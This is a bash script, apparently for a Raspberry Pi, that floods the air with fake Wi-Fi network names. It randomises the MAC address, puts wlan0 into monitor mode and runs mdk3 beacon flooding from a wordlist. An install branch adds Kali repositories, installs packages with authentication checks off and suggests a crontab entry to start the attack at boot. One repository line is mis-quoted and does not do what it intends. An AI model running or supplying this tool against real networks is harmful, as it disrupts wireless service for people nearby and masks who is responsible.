#!/bin/bash
#Puts wireless interface in monitor mode as prep for SSID flooding
function prep(){
	nmcli device disconnect wlan0 > /dev/null 2>&1
	ifconfig wlan0 down
	macchanger -r wlan0
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
}
#if it's your first time running this script you most likely would need to run the --install to get the dependencies
if  [ "$1" == "--install" ]
then
	wget https://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2020.2_all.deb
	apt install ./kali-archive-keyring_2020.2_all.deb
	echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
	echo "deb http://repo.kali.org/kali kali-bleeding-edge main' >> /etc/apt/sources.list"
	apt-get update
	apt-get install mdk3 macchanger pwgen --allow-unauthenticated --assume-yes
	rm ./kali-archive-keyring_2020.2_all.deb
	echo -e "to activate when powered on\nput this in crontab -e \n@reboot ./home/pi/Bulk-SSID/bulk-ssid.sh"
	exit
else
	prep
	mdk3 wlan0 b -a -f /home/pi/Bulk-SSID/wordlist.txt
fi
